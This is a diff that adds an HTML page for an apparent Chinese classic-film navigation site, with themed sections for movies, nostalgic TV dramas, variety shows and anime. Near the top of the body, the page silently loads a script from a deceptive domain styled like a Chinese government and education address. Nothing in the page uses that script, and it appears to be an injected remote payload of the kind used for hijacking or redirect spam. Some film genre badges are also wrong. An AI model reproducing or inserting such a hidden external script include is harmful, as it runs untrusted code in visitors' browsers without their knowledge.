@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>午夜经典电影 - 经典电影/怀旧剧集/老牌综艺/动漫经典导航</title>
+<meta name="description" content="午夜经典电影(wuyejingdiandianying-h5.github.io)整理经典电影、怀旧剧集、老牌综艺、动漫经典片单，午夜时光重温银幕佳作，移动端自适应影视导航站。">
+<meta name="keywords" content="午夜经典电影,经典电影,怀旧剧集,老牌综艺,动漫经典,影视导航">
+<meta name="author" content="午夜经典电影">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="午夜经典电影 - 午夜放映厅">
+<meta property="og:description" content="午夜经典电影整理经典电影、怀旧剧集、老牌综艺、动漫经典片单。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://wuyejingdiandianying-h5.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{font-size:16px;scroll-behavior:smooth}
+body{font-family:'PingFang SC','Microsoft YaHei',sans-serif;background:#0d1117;color:#c9d1d9;line-height:1.7;overflow-x:hidden}
+a{text-decoration:none;color:inherit}
+ul{list-style:none}
+
+/* 胶片顶栏 */
+.reel-bar{position:sticky;top:0;z-index:999;background:rgba(13,17,23,.97);border-bottom:2px solid #21262d;padding:.6rem .9rem}
+.reel-top{display:flex;align-items:center;justify-content:space-between}
+.brand{font-size:1.06rem;font-weight:900}
+.brand b{color:#d4a853;text-shadow:0 0 10px rgba(212,168,83,.35)}
+.brand i{color:#8b949e;font-style:normal}
+.clock{font-size:.7rem;color:#8b949e}
+.clock b{color:#d4a853}
+.filmstrip{height:6px;background:repeating-linear-gradient(90deg,#21262d 0px,#21262d 8px,transparent 8px,transparent 12px);border-radius:3px;margin-top:.5rem}
+.tabs{display:flex;gap:.3rem;margin-top:.55rem;overflow-x:auto;padding:.2rem 0}
+.tabs a{font-size:.74rem;padding:.32rem .7rem;white-space:nowrap;border-radius:4px;border:1px solid #21262d;color:#8b949e;transition:.25s;position:relative}
+.tabs a:before{content:"";position:absolute;top:50%;left:-2px;width:4px;height:4px;background:#d4a853;border-radius:50%;transform:translateY(-50%);opacity:0;transition:.25s}
+.tabs a.active,.tabs a:hover{background:linear-gradient(180deg,#d4a853,#b8943e);color:#0d1117;font-weight:700;border-color:transparent}
+.tabs a.active:before,.tabs a:hover:before{opacity:1;left:-6px}
+
+.wrap{padding:1rem;max-width:1100px;margin:0 auto}
+.frame{display:none;animation:project .45s ease}
+.frame.active{display:block}
+@keyframes project{from{opacity:0;filter:brightness(2)}to{opacity:1;filter:brightness(1)}}
+.frame h2{font-size:1.22rem;color:#d4a853;margin:0 0 1rem;padding-left:.6rem;border-left:4px solid #8b3a3a}
+
+/* 首页 */
+#home .theater{background:radial-gradient(120% 130% at 75% 15%,#1a1f2e,#0d1117 55%);border:1px solid #21262d;border-radius:4px 24px 4px 24px;padding:1.8rem 1.6rem;margin-bottom:1rem;position:relative;overflow:hidden}
+#home .theater:before{content:"🎞️";position:absolute;right:8px;bottom:-12px;font-size:7rem;opacity:.06}
+#home .theater h1{font-size:1.7rem;color:#f0f6fc;margin-bottom:.4rem;font-weight:900}
+#home .theater h1 span{color:#d4a853}
+#home .theater p{font-size:.86rem;color:#8b949e}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:.7rem;margin-top:1rem}
+.stats div{background:#161b22;border:1px solid #21262d;border-radius:6px;padding:.9rem;text-align:center;position:relative}
+.stats div:after{content:"";position:absolute;bottom:0;left:0;width:100%;height:2px;background:linear-gradient(90deg,#d4a853,#8b3a3a)}
+.stats h3{color:#d4a853;font-size:.96rem}
+.stats p{font-size:.66rem;color:#6e7681}
+
+/* 经典电影 - 胶片帧 */
+.celluloid{display:grid;grid-template-columns:repeat(auto-fill,minmax(165px,1fr));gap:.85rem}
+.frame-card{background:#161b22;border:1px solid #21262d;border-radius:6px;overflow:hidden;position:relative;transition:.25s}
+.frame-card:hover{transform:translateY(-4px);box-shadow:0 12px 28px rgba(212,168,83,.12);border-color:#d4a853}
+.frame-card .cell{height:118px;display:flex;align-items:flex-end;padding:.7rem;font-weight:800;font-size:.8rem;color:#0d1117;position:relative}
+.frame-card .cell:before,.frame-card .cell:after{content:"";position:absolute;left:0;right:0;height:3px;background:repeating-linear-gradient(90deg,#0d1117 0px,#0d1117 4px,transparent 4px,transparent 8px)}
+.frame-card .cell:before{top:0}
+.frame-card .cell:after{bottom:0}
+.frame-card .c1{background:linear-gradient(135deg,#d4a853,#b8943e)}
+.frame-card .c2{background:linear-gradient(135deg,#8b3a3a,#5a2525)}
+.frame-card .c3{background:linear-gradient(135deg,#4a5568,#2d3748)}
+.frame-card .c4{background:linear-gradient(135deg,#b8943e,#d4a853)}
+.frame-card .c5{background:linear-gradient(135deg,#5a2525,#8b3a3a)}
+.frame-card .c6{background:linear-gradient(135deg,#2d3748,#4a5568)}
+.frame-card .meta{padding:.65rem}
+.frame-card h3{font-size:.84rem;color:#f0f6fc}
+.frame-card .row{display:flex;justify-content:space-between;font-size:.7rem;color:#6e7681}
+.frame-card .year{color:#d4a853;font-weight:700}
+.frame-card .badge{position:absolute;top:8px;right:8px;background:#0d1117cc;color:#d4a853;font-size:.6rem;padding:.18rem .45rem;border-radius:3px;font-weight:700;border:1px solid #d4a853}
+
+/* 怀旧剧集 - 分集胶片条 */
+.ep-reel{display:flex;flex-direction:column;gap:.8rem}
+.ep-strip{display:flex;gap:.85rem;background:#161b22;border:1px solid #21262d;border-radius:4px 12px 12px 4px;padding:.9rem;position:relative;overflow:hidden}
+.ep-strip:before{content:"";position:absolute;left:0;top:0;bottom:0;width:4px;background:#d4a853}
+.ep-strip .num{width:38px;height:38px;border-radius:4px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:.9rem;font-weight:900;background:linear-gradient(135deg,#d4a853,#b8943e);color:#0d1117}
+.ep-strip h3{font-size:.92rem;color:#f0f6fc}
+.ep-strip p{font-size:.74rem;color:#8b949e}
+.ep-strip .eps{display:flex;gap:.3rem;flex-wrap:wrap;margin-top:.4rem}
+.ep-strip .eps span{background:#21262d;color:#c9d1d9;font-size:.62rem;padding:.12rem .38rem;border-radius:3px;border:1px solid #30363d}
+
+/* 老牌综艺 - 暗金横滑 */
+.show-reel{display:flex;gap:.7rem;overflow-x:auto;padding:.3rem .1rem .5rem}
+.show-reel::-webkit-scrollbar{height:5px}.show-reel::-webkit-scrollbar-thumb{background:#21262d;border-radius:5px}
+.show-card{min-width:158px;background:#161b22;border:1px solid #21262d;border-top:3px solid #d4a853;border-radius:0 0 10px 10px;padding:.85rem;text-align:center}
+.show-card .icon{font-size:1.5rem;margin-bottom:.2rem}
+.show-card h3{font-size:.82rem;color:#d4a853;margin-bottom:.1rem}
+.show-card p{font-size:.68rem;color:#6e7681}
+
+/* 动漫经典 */
+.anime-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:.8rem}
+.anime{background:#161b22;border:1px solid #21262d;border-radius:6px;overflow:hidden}
+.anime .tile{height:96px;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:.78rem;color:#0d1117}
+.anime .a1{background:linear-gradient(135deg,#d4a853,#8b3a3a)}
+.anime .a2{background:linear-gradient(135deg,#4a5568,#d4a853)}
+.anime .a3{background:linear-gradient(135deg,#8b3a3a,#4a5568)}
+.anime .a4{background:linear-gradient(135deg,#b8943e,#d4a853)}
+.anime .body{padding:.55rem}
+.anime h3{font-size:.8rem;color:#f0f6fc}
+.anime span{font-size:.66rem;color:#6e7681}
+
+/* 关于 */
+.about-midnight{background:radial-gradient(120% 120% at 20% 80%,#1a1f2e,#0d1117);border:1px solid #d4a853;border-radius:24px 4px 24px 4px;padding:1.5rem}
+.about-midnight h2{color:#d4a853;border:0;padding:0;margin-bottom:.8rem}
+.about-midnight p{font-size:.85rem;color:#8b949e;margin-bottom:.6rem}
+.about-midnight .info{margin-top:1rem;background:#161b22;border:1px dashed #8b3a3a;border-radius:8px;padding:1rem}
+.about-midnight .info h3{color:#b8943e;margin-bottom:.4rem}
+.about-midnight .info p{font-size:.78rem;color:#6e7681}
+
+.foot{text-align:center;padding:1.4rem 1rem;border-top:1px solid #21262d;margin-top:1.6rem;font-size:.72rem;color:#484f58}
+@media(max-width:768px){.stats{grid-template-columns:repeat(2,1fr)}.celluloid{grid-template-columns:1fr 1fr}.brand{font-size:.94rem}#home .theater h1{font-size:1.38rem}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="reel-bar">
+  <div class="reel-top">
+    <div class="brand">午夜<b>经典电影</b> <i>🎬</i></div>
+    <div class="clock">放映时间 <b>00:47</b></div>
+  </div>
+  <div class="filmstrip"></div>
+  <nav class="tabs">
+    <a href="#" class="tb active" data-f="home">午夜首页</a>
+    <a href="#" class="tb" data-f="movie">经典电影</a>
+    <a href="#" class="tb" data-f="drama">怀旧剧集</a>
+    <a href="#" class="tb" data-f="show">老牌综艺</a>
+    <a href="#" class="tb" data-f="anime">动漫经典</a>
+    <a href="#" class="tb" data-f="about">关于</a>
+  </nav>
+</header>
+
+<main class="wrap">
+
+  <section id="home" class="frame active">
+    <div class="theater">
+      <h1>午夜<b>经典电影</b></h1>
+      <p>夜深人静，打开一部老片。经典电影、怀旧剧集、老牌综艺、动漫经典，在午夜时光里慢慢重温。</p>
+      <div class="stats">
+        <div><h3>经典</h3><p>影史高分佳作</p></div>
+        <div><h3>怀旧</h3><p>年代记忆片单</p></div>
+        <div><h3>修复</h3><p>4K修复版</p></div>
+        <div><h3>深夜</h3><p>午夜专属推荐</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="movie" class="frame">
+    <h2>🎞️ 经典电影 · 胶片帧</h2>
+    <div class="celluloid">
+      <div class="frame-card"><div class="badge">经典</div><div class="cell c1">肖申克的救赎</div><div class="meta"><h3>肖申克的救赎</h3><div class="row"><span>剧情 / 1994</span><span class="year">9.7</span></div></div></div>
+      <div class="frame-card"><div class="badge">华语</div><div class="cell c2">霸王别姬</div><div class="meta"><h3>霸王别姬</h3><div class="row"><span>剧情 / 1993</span><span class="year">9.8</span></div></div></div>
+      <div class="frame-card"><div class="badge">科幻</div><div class="cell c3">阿甘正传</div><div class="meta"><h3>阿甘正传</h3><div class="row"><span>剧情 / 1994</span><span class="year">9.5</span></div></div></div>
+      <div class="frame-card"><div class="badge">动作</div><div class="cell c4">这个杀手不太冷</div><div class="meta"><h3>这个杀手不太冷</h3><div class="row"><span>动作 / 1994</span><span class="year">9.4</span></div></div></div>
+      <div class="frame-card"><div class="badge">悬疑</div><div class="cell c5">盗梦空间</div><div class="meta"><h3>盗梦空间</h3><div class="row"><span>科幻 / 2010</span><span class="year">9.3</span></div></div></div>
+      <div class="frame-card"><div class="badge">动画</div><div class="cell c6">千与千寻</div><div class="meta"><h3>千与千寻</h3><div class="row"><span>动画 / 2001</span><span class="year">9.4</span></div></div></div>
+    </div>
+  </section>
+
+  <section id="drama" class="frame">
+    <h2>📼 怀旧剧集 · 分集胶片</h2>
+    <div class="ep-reel">
+      <div class="ep-strip"><div class="num">1</div><div><h3>西游记（1986）</h3><p>央视经典版，六小龄童主演，全25集。</p><div class="eps"><span>第1集</span><span>第2集</span><span>第3集</span><span>第4集</span><span>第5集</span><span>…</span></div></div></div>
+      <div class="ep-strip"><div class="num">2</div><div><h3>红楼梦（1987）</h3><p>央视经典版，陈晓旭主演，全36集。</p><div class="eps"><span>第1集</span><span>第2集</span><span>第3集</span><span>第4集</span><span>…</span></div></div></div>
+      <div class="ep-strip"><div class="num">3</div><div><h3>新白娘子传奇（1992）</h3><p>赵雅芝主演，经典神话剧，全50集。</p><div class="eps"><span>第1集</span><span>第2集</span><span>第3集</span><span>…</span></div></div></div>
+      <div class="ep-strip"><div class="num">4</div><div><h3>还珠格格（1998）</h3><p>赵薇、林心如主演，暑期档经典，全24集。</p><div class="eps"><span>第1集</span><span>第2集</span><span>第3集</span><span>…</span></div></div></div>
+      <div class="ep-strip"><div class="num">5</div><div><h3>亮剑（2005）</h3><p>李幼斌主演，抗战经典，全30集。</p><div class="eps"><span>第1集</span><span>第2集</span><span>第3集</span><span>…</span></div></div></div>
+    </div>
+  </section>
+
+  <section id="show" class="frame">
+    <h2>🎤 老牌综艺 · 暗金横滑</h2>
+    <div class="show-reel">
+      <div class="show-card"><div class="icon">🎤</div><h3>快乐大本营</h3><p>1997-2021 · 经典综艺</p></div>
+      <div class="show-card"><div class="icon">🧠</div><h3>正大综艺</h3><p>1990-2012 · 知识娱乐</p></div>
+      <div class="show-card"><div class="icon">🎭</div><h3>曲苑杂坛</h3><p>1991-2011 · 曲艺综艺</p></div>
+      <div class="show-card"><div class="icon">🌟</div><h3>同一首歌</h3><p>2000-2012 · 音乐综艺</p></div>
+      <div class="show-card"><div class="icon">🏆</div><h3>星光大道</h3><p>2004-至今 · 选秀综艺</p></div>
+    </div>
+  </section>
+
+  <section id="anime" class="frame">
+    <h2>🎨 动漫经典 · 番剧格子</h2>
+    <div class="anime-grid">
+      <div class="anime"><div class="tile a1">灌篮高手</div><div class="body"><h3>灌篮高手</h3><span>运动 / 1993</span></div></div>
+      <div class="anime"><div class="tile a2">名侦探柯南</div><div class="body"><h3>名侦探柯南</h3><span>推理 / 1996</span></div></div>
+      <div class="anime"><div class="tile a3">数码宝贝</div><div class="body"><h3>数码宝贝</h3><span>冒险 / 1999</span></div></div>
+      <div class="anime"><div class="tile a4">美少女战士</div><div class="body"><h3>美少女战士</h3><span>魔法 / 1992</span></div></div>
+      <div class="anime"><div class="tile a1">龙珠Z</div><div class="body"><h3>龙珠Z</h3><span>热血 / 1989</span></div></div>
+      <div class="anime"><div class="tile a2">新世纪福音战士</div><div class="body"><h3>新世纪福音战士</h3><span>科幻 / 1995</span></div></div>
+    </div>
+  </section>
+
+  <section id="about" class="frame">
+    <div class="about-midnight">
+      <h2>关于 午夜经典电影</h2>
+      <p>午夜经典电影是一个专注于经典影视内容的导航站，整理经典电影、怀旧剧集、老牌综艺、动漫经典的片单与分类浏览。</p>
+      <p>页面采用单文件 H5 结构，CSS/JS 全部内联，手机、平板、电脑一套代码自适应；标题、栏目、片单文字直接写在 HTML 里，方便必应等搜索引擎抓取。</p>
+      <p>本站仅做影视信息展示与分类导航，不提供盗版资源，也不生成 robots.txt / sitemap.xml。</p>
+      <div class="info">
+        <h3>站点信息</h3>
+        <p>网站名称：午夜经典电影</p>
+        <p>网址：https://wuyejingdiandianying-h5.github.io</p>
+        <p>关键词：午夜经典电影、经典电影、怀旧剧集、老牌综艺、动漫经典</p>
+      </div>
+    </div>
+  </section>
+
+  <footer class="foot">
+    <p>© 2024 午夜经典电影 | https://wuyejingdiandianying-h5.github.io</p>
+    <p>本网站仅提供影视信息展示与分类导航，所有资源来自互联网，如有侵权请联系删除。</p>
+  </footer>
+</main>
+
+<script>
+var tb=document.querySelectorAll('.tb');
+tb.forEach(function(a){
+  a.addEventListener('click',function(e){
+    e.preventDefault();
+    var f=this.dataset.f;
+    document.querySelectorAll('.frame').forEach(function(x){x.classList.remove('active')});
+    document.getElementById(f).classList.add('active');
+    tb.forEach(function(x){x.classList.remove('active')});
+    this.classList.add('active');
+    window.scrollTo({top:0,behavior:'smooth'});
+  });
+});
+</script>
+</body>
+</html>
